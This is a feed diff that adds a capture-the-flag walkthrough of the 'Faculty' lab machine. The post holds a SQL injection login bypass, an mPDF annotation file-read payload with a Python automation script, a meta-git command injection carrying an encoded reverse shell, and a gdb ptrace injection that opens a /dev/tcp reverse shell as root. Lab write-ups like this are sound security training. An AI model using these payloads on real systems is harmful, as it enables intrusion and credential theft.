@@ -5,8 +5,245 @@
         <description>Recent content in Posts on MØst Xeon</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Wed, 28 Sep 2022 08:35:17 +0300</lastBuildDate>
+        <lastBuildDate>Tue, 18 Oct 2022 20:50:11 +0300</lastBuildDate>
         <atom:link href="https://mostxeon.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Faculty</title>
+            <link>https://mostxeon.github.io/posts/faculty/</link>
+            <pubDate>Tue, 18 Oct 2022 20:50:11 +0300</pubDate>
+            
+            <guid>https://mostxeon.github.io/posts/faculty/</guid>
+            <description>false</description>
+            <content type="html"><![CDATA[<h2 id="initial-recon">Initial Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Starting with a full tcp port scan using nmap:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p- -A -vvv -oN nmap/all-tcp.txt 10.10.11.169
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-10-18 20:17 EEST
+</span></span><span style="display:flex;"><span>NSE: Loaded <span style="color:#ae81ff">155</span> scripts <span style="color:#66d9ef">for</span> scanning.
+</span></span><span style="display:flex;"><span>NSE: Script Pre-scanning.
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 20:17
+</span></span><span style="display:flex;"><span>Completed NSE at 20:17, 0.00s elapsed
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 20:17
+</span></span><span style="display:flex;"><span>Completed NSE at 20:17, 0.00s elapsed
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 20:17
+</span></span><span style="display:flex;"><span>Completed NSE at 20:17, 0.00s elapsed
+</span></span><span style="display:flex;"><span>Initiating Ping Scan at 20:17
+</span></span><span style="display:flex;"><span>Scanning 10.10.11.169 <span style="color:#f92672">[</span><span style="color:#ae81ff">2</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed Ping Scan at 20:17, 0.14s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating Parallel DNS resolution of <span style="color:#ae81ff">1</span> host. at 20:17
+</span></span><span style="display:flex;"><span>Completed Parallel DNS resolution of <span style="color:#ae81ff">1</span> host. at 20:17, 0.03s elapsed
+</span></span><span style="display:flex;"><span>DNS resolution of <span style="color:#ae81ff">1</span> IPs took 0.03s. Mode: Async <span style="color:#f92672">[</span><span style="color:#75715e">#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span>
+</span></span><span style="display:flex;"><span>Initiating Connect Scan at 20:17
+</span></span><span style="display:flex;"><span>Scanning 10.10.11.169 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.10.11.169
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.10.11.169
+</span></span><span style="display:flex;"><span>Completed Connect Scan at 20:43, 1568.84s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating Service scan at 20:43
+</span></span><span style="display:flex;"><span>Scanning <span style="color:#ae81ff">2</span> services on 10.10.11.169
+</span></span><span style="display:flex;"><span>Completed Service scan at 20:43, 6.58s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">2</span> services on <span style="color:#ae81ff">1</span> host<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>NSE: Script scanning 10.10.11.169.
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 20:43
+</span></span><span style="display:flex;"><span>Completed NSE at 20:43, 3.94s elapsed
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 20:43
+</span></span><span style="display:flex;"><span>Completed NSE at 20:43, 0.62s elapsed
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 20:43
+</span></span><span style="display:flex;"><span>Completed NSE at 20:43, 0.00s elapsed
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.169
+</span></span><span style="display:flex;"><span>Host is up, received syn-ack <span style="color:#f92672">(</span>0.14s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2022-10-18 20:17:22 EEST <span style="color:#66d9ef">for</span> 1580s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON  VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> e9418ce5544d6f14987616e7292d0216 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzpbkoBfa0UKxT+Giw4wE1jz82gGRpuANEdRt+D6gp6hDmrcaODUiU/N+4nX08jcFBk103cLwU8VisxyRu3wHMTHXaYx2WMZXPtb8clv3Hrt+q2m4eL+DBJMkHO10qCx1IwfYcNyJA3CNCj88X8RgWIREalYWyNHeQFzAHZx4SSrCP9aW5QKqAYVAAS4Za0pts4HVYlfuOrxFgO/Z3FL3xynYeyLrFM+iEx0cMl9rIYWG8NzqVnBe180u+7d/y/kcsZU6MkBMmqWQlGA6o4srVx73AqbUDChkv8glvq0ZbD1JYmACuMCdn/GFI8lRlKaw1BaYeuP0l6qgbb65ghdECYEXC3iycPkR77D6gMbIbg4F9wvzD9AF//aCR+6t8F29DyP/mh1J8a+yiUHY2HJJaDvB5vQLg5Y++9yNEDmxlGFQTdJm/n7YhP2Qj+lkfgsERAO9pfIWGCCWaXl6fddUG4gp1bHLZkek+exgsimU7hApGFrJCtYPkf78xC3pvxx0<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 4375103ecb78e9520eebcf7ffdf66d3d <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDH8WAd+YlbEo4Fpz3+UaOYyCJGFa/E29JORgMAIOXVlGUpvMgQqiaqDMXtbt/G03rGEI9h8dpFAmswN1LJ8uig<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> c11caf762b56e8b3b88ae969737be6f5 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINSCwKublVScg9d/3Tc/NAh0n9XH5lE9SBfl2dl+v6F+
+</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://faculty.htb
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NSE: Script Post-scanning.
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 20:43
+</span></span><span style="display:flex;"><span>Completed NSE at 20:43, 0.00s elapsed
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 20:43
+</span></span><span style="display:flex;"><span>Completed NSE at 20:43, 0.00s elapsed
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 20:43
+</span></span><span style="display:flex;"><span>Completed NSE at 20:43, 0.00s elapsed
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 1580.64 seconds
+</span></span></code></pre></div><p>I can see from the above results 2 open ports <em>80 and 22</em>.</p>
+<h2 id="inspecting-web-page">Inspecting Web Page</h2>
+<p>Inspecting the webpage on <em>port 80</em>, it redirects me to <em>faculty.htb</em> so I&rsquo;ll add that to my <em>/etc/hosts</em> file.</p>
+<p>A login page was the first page that appeared to us.</p>
+<p><img src="login_page.png" alt="Login Page"></p>
+<h3 id="bypassing-login-using-sqli">Bypassing Login Using SQLI</h3>
+<p>The first thing I tried was a simple sql injection: <em>&lsquo;or &lsquo;1&rsquo;=&lsquo;1</em> and it worked.</p>
+<p><img src="sql_injection_login_page.png" alt="SQLI Login Page"></p>
+<p><img src="sqli_worked.png" alt="SQLI Worked"></p>
+<h3 id="getting-the-admin-panel">Getting The Admin Panel</h3>
+<p>After inspecting the source code of this single page, I saw stylesheet link pointing to <em>admin directory</em>, so I tried to navigate to this directory, and I got the admin panel.</p>
+<p><img src="locating_admin_directory.png" alt="Source Code Inspection"></p>
+<p><img src="admin_panel.png" alt="Admin Panel"></p>
+<h3 id="exporting-pdfs">Exporting PDFs</h3>
+<p>After navigating through the pages I found that I can export some data as <em>pdf</em>, like the <em>course list</em> and <em>subject list</em>, so I&rsquo;ll try to export them and see if I can get more information from these pdfs.</p>
+<p><img src="viewing_export_pdf_button.png" alt="Export PDF"></p>
+<p>By looking at the <em>URL</em>, it seems that they are using mpdf to generate these pdfs.</p>
+<p><img src="seeing_mpdf_in_the_url.png" alt="Noticing MPDF In URL"></p>
+<p>To get more information about which version is used I can download the pdf and use exiftool on it to see if there is an entry for the version or other useful information.</p>
+<p><img src="download_button_for_pdf.png" alt="Download PDF"></p>
+<p>Using exiftool:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ exiftool OKTLw2f4x5ZgiEUChnypRQ0tWb.pdf 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ExifTool Version Number         : 12.44
+</span></span><span style="display:flex;"><span>File Name                       : OKTLw2f4x5ZgiEUChnypRQ0tWb.pdf
+</span></span><span style="display:flex;"><span>Directory                       : .
+</span></span><span style="display:flex;"><span>File Size                       : <span style="color:#ae81ff">1745</span> bytes
+</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2022:10:18 21:30:50+03:00
+</span></span><span style="display:flex;"><span>File Access Date/Time           : 2022:10:18 21:30:50+03:00
+</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2022:10:18 21:30:50+03:00
+</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
+</span></span><span style="display:flex;"><span>File Type                       : PDF
+</span></span><span style="display:flex;"><span>File Type Extension             : pdf
+</span></span><span style="display:flex;"><span>MIME Type                       : application/pdf
+</span></span><span style="display:flex;"><span>PDF Version                     : 1.4
+</span></span><span style="display:flex;"><span>Linearized                      : No
+</span></span><span style="display:flex;"><span>Page Count                      : <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Page Layout                     : OneColumn
+</span></span><span style="display:flex;"><span>Producer                        : mPDF 6.0
+</span></span><span style="display:flex;"><span>Create Date                     : 2022:10:18 19:27:39+01:00
+</span></span><span style="display:flex;"><span>Modify Date                     : 2022:10:18 19:27:39+01:00
+</span></span></code></pre></div><p>I can see that the version used is <em>mPDF 6.0</em> so now I can search specifically for exploits of this version if they exist.</p>
+<h3 id="understanding-how-data-is-sent-and-processed-to-generate-pdfs">Understanding How Data Is Sent And Processed To Generate PDFs</h3>
+<p>First I need to understand how data is processed to generate these pdf files, so I&rsquo;ll intercept the <em>export pdf</em> request using <em>Burp Suite</em>.</p>
+<p><img src="clicking_pdf_download.png" alt="Export PDF"></p>
+<p><img src="intercepting_request.png" alt="Intercepting Request"></p>
+<p>Looks like <em>/admin/download.php</em> expects a <em>POST</em> request having the content of the pdf file to generate in the body of this request <em>URL encoded 2 times then Base64 encoded</em>.</p>
+<p>This opens for me a new attack surface, because now I can try to inject our payloads after encoding it and let <em>mpdf 6.0</em> process it.</p>
+<h3 id="locating-mpdf-lfi-exploit">Locating MPDF LFI Exploit</h3>
+<p>After searching a little bit about mpdf 6.0 exploits, I saw this issue on <a href="https://github.com/mpdf/mpdf/issues/356"><em>github</em></a>. I also found this <a href="https://medium.com/@jonathanbouman/local-file-inclusion-at-ikea-com-e695ed64d82f"><em>blog</em></a> talking about a very similar approach to the vulnerability.</p>
+<h3 id="exploiting-the-vulnerability">Exploiting the vulnerability</h3>
+<p>A user can include files by injecting html code into a pdf file and thus read arbitrary files from the server, and mpdf 6.0 was affected by that. In order to read files, I need to download the pdf and open it with a pdf viewer to be able to click on the annotation marker and read the file&rsquo;s content.</p>
+<p>This is the payload I&rsquo;ll use:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>Payload: &lt;<span style="color:#f92672">annotation</span> <span style="color:#a6e22e">file</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/etc/passwd&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/etc/passwd&#34;</span>  <span style="color:#a6e22e">icon</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Graph&#34;</span> <span style="color:#a6e22e">title</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Attached File: /etc/passwd&#34;</span> <span style="color:#a6e22e">pos-x</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;195&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>Base64 encoded: PGFubm90YXRpb24lMmJmaWxlJTI1M2QiL2V0Yy9wYXNzd2QiJTJiY29udGVudCUyNTNkIi9ldGMvcGFzc3dkIiUyYiUyYmljb24lMjUzZCJHcmFwaCIlMmJ0aXRsZSUyNTNkIkF0dGFjaGVkJTJiRmlsZSUyNTNhJTJiL2V0Yy9wYXNzd2QiJTJicG9zLXglMjUzZCIxOTUiJTJiLz4=
+</span></span></code></pre></div><p><img src="sending_etcpasswd_payload.png" alt="Sending /etc/passwd Payload"></p>
+<p>Got the pdf name, and since I already saw the path to get the pdf I can navigate to it.</p>
+<p><img src="downloading_etcpasswd_pdf.png" alt="Downloading /etc/passwd pdf"></p>
+<p>The pdf looks empty and this because I opened it using firefox, so the annotation mark will not appear, that&rsquo;s why I need to download it and open it with a proper pdf viewer. (I&rsquo;ll use kali&rsquo;s default pdf viewer <em>Atril Document Viewer</em>)</p>
+<p><img src="Seeing_etcpasswd_attachment.png" alt="Viewing /etc/passwd Annotation Mark"></p>
+<p>Upon clicking the annotation, a new window will popup showing the contents of the file.</p>
+<p><img src="reading_etcpasswd_from_annotation.png" alt="Reading /etc/passwd from Annotation"></p>
+<p>I wrote a <em>python3 script</em> that will automate all this work otherwise it will be painfull to download every pdf manually and then open it to read the contents.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> io
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> PyPDF2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Please provide a filename as argument&#34;</span>)
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>fileToRead <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>getPdfURL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://faculty.htb/admin/download.php&#34;</span>
+</span></span><span style="display:flex;"><span>downloadPdfURL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://faculty.htb/mpdf/tmp/&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;annotation file=&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34; content=&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;  icon=&#34;Graph&#34; title=&#34;Attached File: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34; pos-x=&#34;195&#34; /&gt;&#39;</span><span style="color:#f92672">.</span>format(fileToRead,fileToRead,fileToRead)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote(payload)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote(payload)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(payload<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;ascii&#39;</span>))<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[!] Base64 encoded payload: </span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(payload))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/x-www-form-urlencoded; charset=UTF-8&#39;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>pdfName <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(getPdfURL, data<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;pdf=</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(payload), headers<span style="color:#f92672">=</span>headers)<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] Got filename: </span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(pdfName))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pdfContent <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(downloadPdfURL <span style="color:#f92672">+</span> pdfName)<span style="color:#f92672">.</span>content
+</span></span><span style="display:flex;"><span>pdf <span style="color:#f92672">=</span> PyPDF2<span style="color:#f92672">.</span>PdfReader(io<span style="color:#f92672">.</span>BytesIO(pdfContent))
+</span></span><span style="display:flex;"><span>catalog <span style="color:#f92672">=</span> pdf<span style="color:#f92672">.</span>trailer[<span style="color:#e6db74">&#39;/Root&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://www.bitsgalore.org/2013/01/09/what-do-we-mean-embedded-files-pdf</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] Reading </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(fileToRead), pdf<span style="color:#f92672">.</span>getPage(<span style="color:#ae81ff">0</span>)[<span style="color:#e6db74">&#39;/Annots&#39;</span>][<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>getObject()[<span style="color:#e6db74">&#39;/FS&#39;</span>][<span style="color:#e6db74">&#39;/EF&#39;</span>][<span style="color:#e6db74">&#39;/F&#39;</span>]<span style="color:#f92672">.</span>getData()<span style="color:#f92672">.</span>decode())
+</span></span></code></pre></div><p><img src="reading_etcpasswd_using_script.png" alt="Reading Files Using Script"></p>
+<h3 id="reading-database-credentials">Reading Database Credentials</h3>
+<p>The first thing I&rsquo;ll do is to look for the main application code like index.php to see if I can find the <em>database configuration</em> file to get some <em>credentials</em>.</p>
+<p><img src="reading_index.php_.png" alt="Reading index.php"></p>
+<p><img src="reading_login.php_.png" alt="Reading login.php"></p>
+<p><img src="reading_db_connect.php_.png" alt="Reading db_connect.php"></p>
+<p>I know from the <em>/etc/passwd</em> file read before that there are 2 users on the box <em>gbyolo</em> and <em>developer</em> (They have their own <em>home directory</em> and <em>/bin/bash</em> as login shell).</p>
+<p><img src="enumerating_users_from_etcpasswd.png" alt="Enumerate Users From /etc/passwd"></p>
+<p>I can try to SSH to these users using the password got from reading <em>db_connect.php</em> because people usually reuse passwords everywhere.</p>
+<p><img src="ssh_as_gbyolo.png" alt="SSH As gbyolo"></p>
+<p>And it worked using <em>gbyolo</em> as username.</p>
+<h2 id="escalating-from-user-gbyolo-to-developer">Escalating From User gbyolo To developer</h2>
+<p>If I run <em>sudo -l</em> I get the following result:</p>
+<p><img src="sudo_dash_l.png" alt="sudo -l As gbyolo"></p>
+<p>User gbyolo can run <em>meta-git</em> as developer, howerver this executable is inside <em>/usr/local/bin</em> which means that it was installed manually (wasn&rsquo;t installed using a package manager like <em>apt</em> for example) and there is a big chance that it is out of date and could have some vulnerabilities.</p>
+<p>Searching a little bit on google about meta-git and some possible exploits, I found this <a href="https://hackerone.com/reports/728040"><em>bug report</em></a> on <a href="https://hackerone.com"><em>HackerOne</em></a> which affects every version of meta-git according to <a href="https://security.snyk.io/package/npm/meta-git"><em>snyk</em></a>.</p>
+<p>I can get a reverse shell now as user developer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo -u developer /usr/local/bin/meta-git clone <span style="color:#e6db74">&#39;sss||echo YmFzaCAtaT4mIC9kZXYvdGNwLzEwLjEwLjE2LjU5Lzg5ODkgMD4mMQo= | base64 -d | bash&#39;</span>
+</span></span></code></pre></div><p>Howerver I need to be first in a directory writable by developer user, so I will navigate to <em>/tmp/</em>.</p>
+<p><img src="gettting_reverse_shell_as_developer.png" alt="Getting Reverse Shell As developer"></p>
+<p>I will get a fully interactive shell using python:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>$ <span style="color:#f92672">[</span>ctrl-z<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>$ stty raw -echo; fg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#66d9ef">then</span> press enter<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p><img src="getting_fully_interactive_shell.png" alt="Getting Fully Interactive Shell"></p>
+<h2 id="post-enumeration">Post Enumeration</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bash-5.0$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span>,1001<span style="color:#f92672">(</span>debug<span style="color:#f92672">)</span>,1003<span style="color:#f92672">(</span>faculty<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bash-5.0$ find / -group debug 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/usr/bin/gdb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bash-5.0$ ls -la /usr/bin/gdb
+</span></span><span style="display:flex;"><span>-rwxr-x--- <span style="color:#ae81ff">1</span> root debug <span style="color:#ae81ff">8440200</span> Dec  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2021</span> /usr/bin/gdb
+</span></span></code></pre></div><p>User developer is part of <em>debug</em> group that owns <em>/usr/bin/gdb</em> and can run it.</p>
+<p>And if I check <em>linux capabilities</em> for this binary using <em>getcap</em>, I can see that it has <em>cap_sys_ptrace</em> capability, which means that the current user can attach to other processes and trace their system calls.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bash-5.0$ getcap /usr/bin/gdb 
+</span></span><span style="display:flex;"><span>/usr/bin/gdb <span style="color:#f92672">=</span> cap_sys_ptrace+ep
+</span></span></code></pre></div><h2 id="getting-root">Getting root</h2>
+<p>I can abuse this to attach to root running processes and call a reverse shell back to me.</p>
+<p>This can be done with any process by injecting a compiled reverse shell into its memory, howerver if the process is running python3 it becomes easier, because I can call the build in python3 system function and pass a reverse shell to it directly.</p>
+<p>Among the running processes I will choose this python3 process:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bash-5.0$ ps aux | grep root
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">731</span>  0.0  0.9  <span style="color:#ae81ff">26896</span> <span style="color:#ae81ff">18204</span> ?        Ss   13:15   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Then I will debug it using gdb and inject my malicious code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ gdb -p <span style="color:#ae81ff">731</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> call <span style="color:#f92672">(</span>void<span style="color:#f92672">)</span>system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/bash -c &#39;bash -i&gt;&amp; /dev/tcp/10.10.16.59/8988 0&gt;&amp;1&#39;&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p><img src="getting_root.png" alt="Getting root"></p>
+]]></content>
